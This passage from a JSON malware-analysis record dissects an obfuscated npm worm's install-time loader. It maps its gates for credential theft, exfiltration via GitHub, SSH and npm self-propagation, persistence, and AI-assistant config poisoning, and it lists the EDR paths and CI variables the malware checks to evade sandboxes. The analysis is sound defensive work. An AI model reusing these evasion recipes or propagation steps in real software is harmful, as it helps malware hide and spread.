                  "start_byte": 565558,
                  "end_byte": 565576,
                  "node_type": "variable_declarator",
                  "sha256": "2336788dc988cbb6",
                  "line": 1
                }
              },
              {
                "hop": "call",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 565632,
                  "end_byte": 565660,
                  "node_type": "await_expression",
                  "sha256": "264c5f7956adc0d6",
                  "line": 1
                }
              },
              {
                "hop": "def",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 415089,
                  "end_byte": 415888,
                  "node_type": "method_definition",
                  "sha256": "f4eb24f7548056a0",
                  "line": 1
                }
              }
            ]
          },
          {
            "behaviour": "exfil",
            "sink_kind": "network",
            "sink": {
              "file": "index.js",
              "derived_from": "d11",
              "start_byte": 576809,
              "end_byte": 577002,
              "node_type": "call_expression",
              "sha256": "44ee3be891afb7bb",
              "line": 1
            },
            "witness": [
              {
                "hop": "call",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 581666,
                  "end_byte": 581689,
                  "node_type": "call_expression",
                  "sha256": "7dde769c115cc13e",
                  "line": 1
                }
              },
              {
                "hop": "def",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 212513,
                  "end_byte": 212643,
                  "node_type": "method_definition",
                  "sha256": "3e1067e8c5280b20",
                  "line": 1
                }
              },
              {
                "hop": "call",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 212587,
                  "end_byte": 212602,
                  "node_type": "call_expression",
                  "sha256": "88eeb538f412a97b",
                  "line": 1
                }
              },
              {
                "hop": "def",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 212135,
                  "end_byte": 212513,
                  "node_type": "method_definition",
                  "sha256": "98e1c0b91a10033f",
                  "line": 1
                }
              },
              {
                "hop": "bind",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 581459,
                  "end_byte": 581491,
                  "node_type": "pair",
                  "sha256": "0a0b2de5da960cb8",
                  "line": 1
                }
              },
              {
                "hop": "call",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 212409,
                  "end_byte": 212436,
                  "node_type": "call_expression",
                  "sha256": "93bdf93b776a5a14",
                  "line": 1
                }
              },
              {
                "hop": "def",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 213320,
                  "end_byte": 214126,
                  "node_type": "field_definition",
                  "sha256": "6c28603be51c0dcc",
                  "line": 1
                }
              },
              {
                "hop": "call",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 213996,
                  "end_byte": 214024,
                  "node_type": "call_expression",
                  "sha256": "a312c41be6301514",
                  "line": 1
                }
              },
              {
                "hop": "def",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 575738,
                  "end_byte": 576011,
                  "node_type": "method_definition",
                  "sha256": "fae16ec5376f94e9",
                  "line": 1
                }
              },
              {
                "hop": "call",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 575978,
                  "end_byte": 576009,
                  "node_type": "call_expression",
                  "sha256": "9a42e4b1c408991e",
                  "line": 1
                }
              },
              {
                "hop": "def",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 577257,
                  "end_byte": 578299,
                  "node_type": "method_definition",
                  "sha256": "0be3b90a6b49fd0e",
                  "line": 1
                }
              },
              {
                "hop": "call",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 577859,
                  "end_byte": 577917,
                  "node_type": "call_expression",
                  "sha256": "bf527c9c121862f3",
                  "line": 1
                }
              },
              {
                "hop": "def",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 576440,
                  "end_byte": 577257,
                  "node_type": "method_definition",
                  "sha256": "8163b380a2710ba0",
                  "line": 1
                }
              }
            ],
            "unresolved": "dynamic_dispatch"
          },
          {
            "behaviour": "self_propagation",
            "sink_kind": "network",
            "sink": {
              "file": "index.js",
              "derived_from": "d11",
              "start_byte": 190829,
              "end_byte": 190873,
              "node_type": "call_expression",
              "sha256": "6f8a3fe42d91b397",
              "line": 1
            },
            "witness": [
              {
                "hop": "call",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 581525,
                  "end_byte": 581555,
                  "node_type": "call_expression",
                  "sha256": "33fdfc63df1ac08a",
                  "line": 1
                }
              },
              {
                "hop": "def",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 208121,
                  "end_byte": 209405,
                  "node_type": "method_definition",
                  "sha256": "2e6049fa858be9ba",
                  "line": 1
                }
              },
              {
                "hop": "call",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 208812,
                  "end_byte": 208846,
                  "node_type": "call_expression",
                  "sha256": "59172fddafdd9c53",
                  "line": 1
                }
              },
              {
                "hop": "def",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 210626,
                  "end_byte": 211373,
                  "node_type": "method_definition",
                  "sha256": "7416d11431a7a6dd",
                  "line": 1
                }
              },
              {
                "hop": "call",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 211228,
                  "end_byte": 211258,
                  "node_type": "call_expression",
                  "sha256": "a0654db4d5c27114",
                  "line": 1
                }
              },
              {
                "hop": "def",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 188846,
                  "end_byte": 189387,
                  "node_type": "method_definition",
                  "sha256": "f27054003b323908",
                  "line": 1
                }
              },
              {
                "hop": "call",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 189228,
                  "end_byte": 189261,
                  "node_type": "call_expression",
                  "sha256": "70fcd796a9cf7bcf",
                  "line": 1
                }
              },
              {
                "hop": "def",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 190691,
                  "end_byte": 190905,
                  "node_type": "method_definition",
                  "sha256": "7fe5e29837551acd",
                  "line": 1
                }
              }
            ]
          },
          {
            "behaviour": "persistence",
            "sink_kind": "fs_write",
            "sink": {
              "file": "index.js",
              "derived_from": "d11",
              "start_byte": 264916,
              "end_byte": 264977,
              "node_type": "call_expression",
              "sha256": "327eebf9dc4eb153",
              "line": 1
            },
            "witness": [
              {
                "hop": "call",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 581700,
                  "end_byte": 581723,
                  "node_type": "call_expression",
                  "sha256": "54a2a451492ab531",
                  "line": 1
                }
              },
              {
                "hop": "def",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 313970,
                  "end_byte": 314733,
                  "node_type": "function_declaration",
                  "sha256": "fee2992f388f6c9e",
                  "line": 1
                }
              },
              {
                "hop": "call",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 314716,
                  "end_byte": 314720,
                  "node_type": "call_expression",
                  "sha256": "cb2dabdb92a339aa",
                  "line": 1
                }
              },
              {
                "hop": "def",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 313920,
                  "end_byte": 313970,
                  "node_type": "function_declaration",
                  "sha256": "35e768e015890122",
                  "line": 1
                }
              }
            ],
            "unresolved": "dynamic_dispatch"
          }
        ],
        "min_conditions": 1
      },
      "else": null,
      "provenance": "out_of_set"
    },
    {
      "gate_id": "g4",
      "hook": "node_gyp_implicit",
      "expression": "c1 && c2 && c3 && c4 && c5 && c6 && c16 && (c7 || c15) && c8 && c9 && c10 && c11",
      "guards": [
        {
          "candidate": null,
          "site": {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 338878,
            "end_byte": 338907,
            "node_type": "if_statement",
            "sha256": "b4c4979759eebd46",
            "line": 1
          },
          "kind": "early_exit",
          "arm": "else",
          "conditions": [
            "c1",
            "c2",
            "c3",
            "c4"
          ],
          "via": [
            {
              "file": "index.js",
              "derived_from": "d11",
              "start_byte": 581226,
              "end_byte": 581236,
              "node_type": "await_expression",
              "sha256": "77786daaafb3f883",
              "line": 1
            }
          ]
        },
        {
          "candidate": null,
          "site": {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 338907,
            "end_byte": 338947,
            "node_type": "if_statement",
            "sha256": "a60dfbe17ded7d90",
            "line": 1
          },
          "kind": "early_exit",
          "arm": "else",
          "conditions": [
            "c5",
            "c6",
            "c16"
          ],
          "via": [
            {
              "file": "index.js",
              "derived_from": "d11",
              "start_byte": 581226,
              "end_byte": 581236,
              "node_type": "await_expression",
              "sha256": "77786daaafb3f883",
              "line": 1
            }
          ]
        },
        {
          "candidate": null,
          "site": {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 339004,
            "end_byte": 339103,
            "node_type": "if_statement",
            "sha256": "0d2f9c75b2642bb9",
            "line": 1
          },
          "kind": "early_exit",
          "arm": "else",
          "conditions": [
            "c7",
            "c15"
          ],
          "via": [
            {
              "file": "index.js",
              "derived_from": "d11",
              "start_byte": 581226,
              "end_byte": 581236,
              "node_type": "await_expression",
              "sha256": "77786daaafb3f883",
              "line": 1
            }
          ]
        },
        {
          "candidate": null,
          "site": {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 288743,
            "end_byte": 288788,
            "node_type": "if_statement",
            "sha256": "c779df192e7c1e54",
            "line": 1
          },
          "kind": "early_exit",
          "arm": "else",
          "conditions": [
            "c8",
            "c9",
            "c10",
            "c11"
          ]
        }
      ],
      "polarity": "evade",
      "effect": "enables",
      "purpose": "anti_analysis",
      "purpose_reason": "i1.shouldExecute lets the dropped Python updater run only with >=4 CPUs, no EDR install path (w4: RQ paths) or EDR process in `ps aux` (w4: DQ names), and no CI marker (H9). An anti-sandbox check behind the IX/z7/yX early exits.",
      "then": {
        "behaviours": [
          "write_file",
          "spawn_process",
          "download",
          "persistence"
        ],
        "env_recipe": {
          "cpu_count": 4,
          "file_absent": [
            "/opt/CrowdStrike",
            "/Library/CS/falcon",
            "/opt/carbonblack",
            "/opt/sentinelone"
          ],
          "env_var_absent": [
            "CI",
            "GITHUB_ACTIONS",
            "GITLAB_CI",
            "TRAVIS",
            "CIRCLECI",
            "JENKINS_URL",
            "BUILD_BUILDURI",
            "CODEBUILD_BUILD_ID",
            "BUILDKITE",
            "APPVEYOR",
            "BITBUCKET_BUILD_NUMBER",
            "DRONE",
            "SEMAPHORE",
            "TEAMCITY_VERSION",
            "bamboo_agentId",
            "BITRISE_IO",
            "CIRRUS_CI",
            "CF_BUILD_ID",
            "CI_NAME",
            "NETLIFY",
            "VERCEL",
            "NOW_GITHUB_DEPLOYMENT",
            "WERCKER_MAIN_PIPELINE_STARTED",
            "BUDDY_WORKSPACE_ID",
            "SHIPPABLE",
            "JB_SPACE_EXECUTION_NUMBER",
            "SAILCI",
            "VELA",
            "SCREWDRIVER",
            "CF_PAGES",
            "DISTELLI_APPNAME"
          ]
        },
        "recipe_guessed_fields": [],
        "regions": [
          {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 288788,
            "end_byte": 288872,
            "node_type": "lexical_declaration",
            "sha256": "9eac386426432ead",
            "line": 1
          },
          {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 288872,
            "end_byte": 289251,
            "node_type": "try_statement",
            "sha256": "8c055ed981f2c3cd",
            "line": 1
          }
        ],
        "payload": [
          {
            "behaviour": "write_file",
            "sink_kind": "fs_write",
            "sink": {
              "file": "index.js",
              "derived_from": "d11",
              "start_byte": 288876,
              "end_byte": 288914,
              "node_type": "call_expression",
              "sha256": "88de24f39016e60e",
              "line": 1
            },
            "witness": []
          },
          {
            "behaviour": "spawn_process",
            "sink_kind": "exec",
            "sink": {
              "file": "index.js",
              "derived_from": "d11",
              "start_byte": 288929,
              "end_byte": 289020,
              "node_type": "call_expression",
              "sha256": "acc3af4cc0f3c98b",
              "line": 1
            },
            "witness": []
          },
          {
            "behaviour": "persistence",
            "sink_kind": "exec",
            "sink": {
              "file": "index.js",
              "derived_from": "d11",
              "start_byte": 288929,
              "end_byte": 289020,
              "node_type": "call_expression",
              "sha256": "acc3af4cc0f3c98b",
              "line": 1
            },
            "witness": []
          }
        ],
        "min_conditions": 12
      },
      "else": null,
      "provenance": "out_of_set"
    },
    {
      "gate_id": "g5",
      "hook": "node_gyp_implicit",
      "expression": "c1 && c2 && c3 && c4 && c5 && c6 && c16 && (c7 || c15) && c12 && (c13 || c14)",
      "guards": [
        {
          "candidate": null,
          "site": {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 338878,
            "end_byte": 338907,
            "node_type": "if_statement",
            "sha256": "b4c4979759eebd46",
            "line": 1
          },
          "kind": "early_exit",
          "arm": "else",
          "conditions": [
            "c1",
            "c2",
            "c3",
            "c4"
          ],
          "via": [
            {
              "file": "index.js",
              "derived_from": "d11",
              "start_byte": 581226,
              "end_byte": 581236,
              "node_type": "await_expression",
              "sha256": "77786daaafb3f883",
              "line": 1
            }
          ]
        },
        {
          "candidate": null,
          "site": {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 338907,
            "end_byte": 338947,
            "node_type": "if_statement",
            "sha256": "a60dfbe17ded7d90",
            "line": 1
          },
          "kind": "early_exit",
          "arm": "else",
          "conditions": [
            "c5",
            "c6",
            "c16"
          ],
          "via": [
            {
              "file": "index.js",
              "derived_from": "d11",
              "start_byte": 581226,
              "end_byte": 581236,
              "node_type": "await_expression",
              "sha256": "77786daaafb3f883",
              "line": 1
            }
          ]
        },
        {
          "candidate": null,
          "site": {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 339004,
            "end_byte": 339103,
            "node_type": "if_statement",
            "sha256": "0d2f9c75b2642bb9",
            "line": 1
          },
          "kind": "early_exit",
          "arm": "else",
          "conditions": [
            "c7",
            "c15"
          ],
          "via": [
            {
              "file": "index.js",
              "derived_from": "d11",
              "start_byte": 581226,
              "end_byte": 581236,
              "node_type": "await_expression",
              "sha256": "77786daaafb3f883",
              "line": 1
            }
          ]
        },
        {
          "candidate": null,
          "site": {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 315005,
            "end_byte": 315072,
            "node_type": "if_statement",
            "sha256": "50b8c6423cbecc26",
            "line": 1
          },
          "kind": "if",
          "arm": "then",
          "conditions": [
            "c12"
          ]
        },
        {
          "candidate": null,
          "site": {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 310421,
            "end_byte": 310461,
            "node_type": "if_statement",
            "sha256": "b03d24fe8971eadd",
            "line": 1
          },
          "kind": "early_exit",
          "arm": "else",
          "conditions": [
            "c13",
            "c14"
          ]
        }
      ],
      "polarity": "activate",
      "effect": "enables",
      "purpose": "data_availability",
      "purpose_reason": "PX runs a1.execute only when a1.shouldExecute finds ssh (`which ssh` exits 0 with output); a1.execute then needs at least one host from ~/.ssh/known_hosts or ~/.ssh/config, and scp's the worm to each host and runs it there over ssh.",
      "then": {
        "behaviours": [
          "self_propagation"
        ],
        "env_recipe": {
          "installed_tool": [
            "ssh"
          ],
          "file_present": [
            "~/.ssh/known_hosts"
          ]
        },
        "recipe_guessed_fields": [],
        "regions": [
          {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 310613,
            "end_byte": 311141,
            "node_type": "for_statement",
            "sha256": "cd78578151ba53b1",
            "line": 1
          }
        ],
        "payload": [
          {
            "behaviour": "self_propagation",
            "sink_kind": "exec",
            "sink": {
              "file": "index.js",
              "derived_from": "d11",
              "start_byte": 312854,
              "end_byte": 313095,
              "node_type": "call_expression",
              "sha256": "670506b324e22602",
              "line": 1
            },
            "witness": [
              {
                "hop": "call",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 310817,
                  "end_byte": 310866,
                  "node_type": "call_expression",
                  "sha256": "4c36741b7c92bee2",
                  "line": 1
                }
              },
              {
                "hop": "def",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 312402,
                  "end_byte": 313919,
                  "node_type": "method_definition",
                  "sha256": "8c74b1e7df0eb721",
                  "line": 1
                }
              }
            ]
          }
        ],
        "min_conditions": 10
      },
      "else": null,
      "provenance": "out_of_set"
    },
    {
      "gate_id": "g6",
      "hook": "node_gyp_implicit",
      "expression": "c1 && c2 && c3 && c4 && c5 && c6 && c16 && (c7 || c15) && c19 && c18 && c17",
      "guards": [
        {
          "candidate": null,
          "site": {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 338878,
            "end_byte": 338907,
            "node_type": "if_statement",
            "sha256": "b4c4979759eebd46",
            "line": 1
          },
          "kind": "early_exit",
          "arm": "else",
          "conditions": [
            "c1",
            "c2",
            "c3",
            "c4"
          ],
          "via": [
            {
              "file": "index.js",
              "derived_from": "d11",
              "start_byte": 581226,
              "end_byte": 581236,
              "node_type": "await_expression",
              "sha256": "77786daaafb3f883",
              "line": 1
            }
          ]
        },
        {
          "candidate": null,
          "site": {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 338907,
            "end_byte": 338947,
            "node_type": "if_statement",
            "sha256": "a60dfbe17ded7d90",
            "line": 1
          },
          "kind": "early_exit",
          "arm": "else",
          "conditions": [
            "c5",
            "c6",
            "c16"
          ],
          "via": [
            {
              "file": "index.js",
              "derived_from": "d11",
              "start_byte": 581226,
              "end_byte": 581236,
              "node_type": "await_expression",
              "sha256": "77786daaafb3f883",
              "line": 1
            }
          ]
        },
        {
          "candidate": null,
          "site": {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 339004,
            "end_byte": 339103,
            "node_type": "if_statement",
            "sha256": "0d2f9c75b2642bb9",
            "line": 1
          },
          "kind": "early_exit",
          "arm": "else",
          "conditions": [
            "c7",
            "c15"
          ],
          "via": [
            {
              "file": "index.js",
              "derived_from": "d11",
              "start_byte": 581226,
              "end_byte": 581236,
              "node_type": "await_expression",
              "sha256": "77786daaafb3f883",
              "line": 1
            }
          ]
        },
        {
          "candidate": null,
          "site": {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 208759,
            "end_byte": 208793,
            "node_type": "subscript_expression",
            "sha256": "fff5d555b9e24685",
            "line": 1
          },
          "kind": "if",
          "arm": "then",
          "conditions": [
            "c19"
          ]
        },
        {
          "candidate": null,
          "site": {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 210979,
            "end_byte": 211011,
            "node_type": "if_statement",
            "sha256": "540533cc3363ddb8",
            "line": 1
          },
          "kind": "early_exit",
          "arm": "else",
          "conditions": [
            "c18"
          ]
        },
        {
          "candidate": null,
          "site": {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 188974,
            "end_byte": 189025,
            "node_type": "call_expression",
            "sha256": "fdc7b1cea49ae691",
            "line": 1
          },
          "kind": "if",
          "arm": "then",
          "conditions": [
            "c17"
          ]
        }
      ],
      "polarity": "activate",
      "effect": "enables",
      "purpose": "data_availability",
      "purpose_reason": "handleNpmTokens runs only for a collected string matching the npm token pattern, E7 keeps it only if the registry lists it with bypass_2fa and package write, and g1.execute republishes the victim's packages only on darwin or linux.",
      "then": {
        "behaviours": [
          "self_propagation"
        ],
        "env_recipe": {
          "os": "linux",
          "file_present": [
            "~/.npmrc"
          ],
          "network": {
            "registry[.]npmjs[.]org:443": "reachable"
          }
        },
        "recipe_guessed_fields": [
          "os",
          "file_present"
        ],
        "regions": [
          {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 581494,
            "end_byte": 581556,
            "node_type": "for_in_statement",
            "sha256": "8a9efddf93c5a94d",
            "line": 1
          },
          {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 208794,
            "end_byte": 208872,
            "node_type": "expression_statement",
            "sha256": "aca99e03fd082c11",
            "line": 1
          },
          {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 211101,
            "end_byte": 211259,
            "node_type": "expression_statement",
            "sha256": "b7931e5628fdf1d9",
            "line": 1
          },
          {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 189082,
            "end_byte": 189158,
            "node_type": "lexical_declaration",
            "sha256": "96a3301008ca8aca",
            "line": 1
          },
          {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 189158,
            "end_byte": 189344,
            "node_type": "return_statement",
            "sha256": "197e26f7f9bd4ca6",
            "line": 1
          }
        ],
        "payload": [
          {
            "behaviour": "self_propagation",
            "sink_kind": "network",
            "sink": {
              "file": "index.js",
              "derived_from": "d11",
              "start_byte": 190829,
              "end_byte": 190873,
              "node_type": "call_expression",
              "sha256": "6f8a3fe42d91b397",
              "line": 1
            },
            "witness": [
              {
                "hop": "call",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 581525,
                  "end_byte": 581555,
                  "node_type": "call_expression",
                  "sha256": "33fdfc63df1ac08a",
                  "line": 1
                }
              },
              {
                "hop": "def",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 208121,
                  "end_byte": 209405,
                  "node_type": "method_definition",
                  "sha256": "2e6049fa858be9ba",
                  "line": 1
                }
              },
              {
                "hop": "call",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 208812,
                  "end_byte": 208846,
                  "node_type": "call_expression",
                  "sha256": "59172fddafdd9c53",
                  "line": 1
                }
              },
              {
                "hop": "def",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 210626,
                  "end_byte": 211373,
                  "node_type": "method_definition",
                  "sha256": "7416d11431a7a6dd",
                  "line": 1
                }
              },
              {
                "hop": "call",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 211228,
                  "end_byte": 211258,
                  "node_type": "call_expression",
                  "sha256": "a0654db4d5c27114",
                  "line": 1
                }
              },
              {
                "hop": "def",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 188846,
                  "end_byte": 189387,
                  "node_type": "method_definition",
                  "sha256": "f27054003b323908",
                  "line": 1
                }
              },
              {
                "hop": "call",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 189228,
                  "end_byte": 189261,
                  "node_type": "call_expression",
                  "sha256": "70fcd796a9cf7bcf",
                  "line": 1
                }
              },
              {
                "hop": "def",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 190691,
                  "end_byte": 190905,
                  "node_type": "method_definition",
                  "sha256": "7fe5e29837551acd",
                  "line": 1
                }
              }
            ]
          }
        ],
        "min_conditions": 11
      },
      "else": null,
      "provenance": "out_of_set"
    },
    {
      "gate_id": "g7",
      "hook": "node_gyp_implicit",
      "expression": "c1 && c2 && c3 && c4 && (c20 || c21) && c22 && (c23 || c24) && (c25 || c26) && c28 && c27",
      "guards": [
        {
          "candidate": null,
          "site": {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 338878,
            "end_byte": 338907,
            "node_type": "if_statement",
            "sha256": "b4c4979759eebd46",
            "line": 1
          },
          "kind": "early_exit",
          "arm": "else",
          "conditions": [
            "c1",
            "c2",
            "c3",
            "c4"
          ]
        },
        {
          "candidate": null,
          "site": {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 338381,
            "end_byte": 338414,
            "node_type": "if_statement",
            "sha256": "58bc816e54e469cc",
            "line": 1
          },
          "kind": "early_exit",
          "arm": "else",
          "conditions": [
            "c20",
            "c21"
          ]
        },
        {
          "candidate": null,
          "site": {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 338421,
            "end_byte": 338450,
            "node_type": "subscript_expression",
            "sha256": "f7c694e204eaed8a",
            "line": 1
          },
          "kind": "if",
          "arm": "then",
          "conditions": [
            "c22"
          ]
        },
        {
          "candidate": null,
          "site": {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 338531,
            "end_byte": 338629,
            "node_type": "binary_expression",
            "sha256": "189f9fb74ae69876",
            "line": 1
          },
          "kind": "if",
          "arm": "then",
          "conditions": [
            "c23",
            "c24",
            "c25",
            "c26"
          ]
        },
        {
          "candidate": null,
          "site": {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 329146,
            "end_byte": 329300,
            "node_type": "if_statement",
            "sha256": "f2d82f6e1a813120",
            "line": 1
          },
          "kind": "if",
          "arm": "then",
          "conditions": [
            "c28"
          ]
        },
        {
          "candidate": null,
          "site": {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 329179,
            "end_byte": 329219,
            "node_type": "if_statement",
            "sha256": "8ce43337fdfa6c5f",
            "line": 1
          },
          "kind": "early_exit",
          "arm": "else",
          "conditions": [
            "c27"
          ]
        }
      ],
      "polarity": "activate",
      "effect": "enables",
      "purpose": "targeting",
      "purpose_reason": "bK runs the X6 npm OIDC republish only inside GitHub Actions, when WORKFLOW_ID and REPO_ID_SUFFIX (set by the workflows the worm injects) match GITHUB_WORKFLOW_REF and GITHUB_REPOSITORY, then exits before the main payload.",
      "then": {
        "behaviours": [
          "self_propagation"
        ],
        "env_recipe": {
          "env_var": {
            "GITHUB_ACTIONS": "true",
            "WORKFLOW_ID": "w",
            "GITHUB_WORKFLOW_REF": "w",
            "OIDC_PACKAGES": "p"
          },
          "env_var_absent": [
            "REPO_ID_SUFFIX"
          ],
          "network": {
            "registry[.]npmjs[.]org:443": "reachable"
          }
        },
        "recipe_guessed_fields": [
          "env_var",
          "env_var_absent"
        ],
        "regions": [
          {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 338907,
            "end_byte": 338947,
            "node_type": "if_statement",
            "sha256": "a60dfbe17ded7d90",
            "line": 1
          },
          {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 338414,
            "end_byte": 338771,
            "node_type": "try_statement",
            "sha256": "e3908bef12abef54",
            "line": 1
          },
          {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 338452,
            "end_byte": 338528,
            "node_type": "lexical_declaration",
            "sha256": "9fe56f0974c08e00",
            "line": 1
          },
          {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 338630,
            "end_byte": 338679,
            "node_type": "expression_statement",
            "sha256": "317b427f4e386a85",
            "line": 1
          },
          {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 329160,
            "end_byte": 329179,
            "node_type": "lexical_declaration",
            "sha256": "8b2545a2a423b62d",
            "line": 1
          },
          {
            "file": "index.js",
            "derived_from": "d11",
            "start_byte": 329219,
            "end_byte": 329283,
            "node_type": "return_statement",
            "sha256": "e68029cca70f4d53",
            "line": 1
          }
        ],
        "payload": [
          {
            "behaviour": "self_propagation",
            "sink_kind": "network",
            "sink": {
              "file": "index.js",
              "derived_from": "d11",
              "start_byte": 329232,
              "end_byte": 329277,
              "node_type": "call_expression",
              "sha256": "220fa43cccb3ec01",
              "line": 1
            },
            "witness": [
              {
                "hop": "call",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 338636,
                  "end_byte": 338657,
                  "node_type": "call_expression",
                  "sha256": "f13363fbd43f5829",
                  "line": 1
                }
              },
              {
                "hop": "def",
                "anchor": {
                  "file": "index.js",
                  "derived_from": "d11",
                  "start_byte": 328797,
                  "end_byte": 329301,
                  "node_type": "method_definition",
                  "sha256": "fa544954f35dea74",
                  "line": 1
                }
              }
            ]
          }
        ],
        "min_conditions": 10
      },
      "else": null,
      "provenance": "out_of_set"
    }
  ],
  "behaviours": {
    "ungated": [
      "write_file",
      "download",
      "exec_downloaded"
    ],
    "gated": [
      "recon",
      "cred_read",
      "exfil",
      "self_propagation",
      "persistence",
      "write_file",
      "spawn_process",
      "download"
    ]
  },
  "obfuscation": {
    "level": "heavy",
    "techniques": [
      "char-code array joined to a string and Caesar-shifted (n=2), handed to eval",
      "AES-128-GCM encrypted stages (createDecipheriv aes-128-gcm) decrypted at runtime, one eval'd and one written to a temp file and run",
      "obfuscator.io string array (base64 table, rotation checksum, decoder indexed through const-object properties)",
      "bespoke pbkdf2 + SHA256-CTR substitution-permutation string cipher (fn f489094fb) hiding endpoints and env-var names",
      "AES-256-GCM + gzip encoded secondary payload (dropped Python updater and its stdin)",
      "esbuild bundling with minified single-letter identifiers"
    ],
    "decoded": true,
    "unrecovered": []
  },
  "reachability": {
    "needs_remote": true,
    "endpoints": [
      {
        "indicator": "api[.]github[.]com",
        "role": "exfil_sink"
      },
      {
        "indicator": "github[.]com",
        "role": "second_stage"
      },
      {
        "indicator": "api[.]anthropic[.]com",
        "role": "exfil_sink"
      }
    ]
  },
  "attack_type": "compromised_maintainer",
  "family_hint": "shai-hulud (second coming npm worm)",
  "claude_assessment": "malicious",
  "assessment_reason": "At install, node-gyp runs binding.gyp's `<!(node index.js)` command expansion, and index.js is a five-layer-obfuscated loader that decrypts and runs (under a downloaded Bun runtime) a credential-stealing, self-propagating worm. It harvests host info, GitHub/npm/cloud (AWS/Azure/GCP/Vault) credentials and SSH hosts, exfiltrates them via attacker-created GitHub repos, poisons AI-assistant configs, and drops an RSA-signed Python updater. The payload is guarded by honeytoken/sandbox-detection, Russian-locale exclusion, a reinfection lock, and CPU/EDR/CI anti-sandbox gates.",
  "label_disagreement": false,
  "confidence": "high",
  "needs_manual_review": true,
  "review_reasons": [
    "All gates and conditions are out of the deterministic candidate set (the extractor saw only the char-code eval in index.js); every gate here was added by hand after decoding five obfuscation layers.",
    "g7 (bK OIDC republish, added in repair) compares env vars with other env vars, so c24 and c26 have no constant value and their value claims cannot be checked against a literal.",
    "fL's catch runs t1() and PX after uX throws, so l1, i1 and a1 stay reachable without the uX exit guards having decided anything (cwd gone, or lock read failure). The schema has no way to express this route; a reviewer should decide how g4 and g5 treat it.",
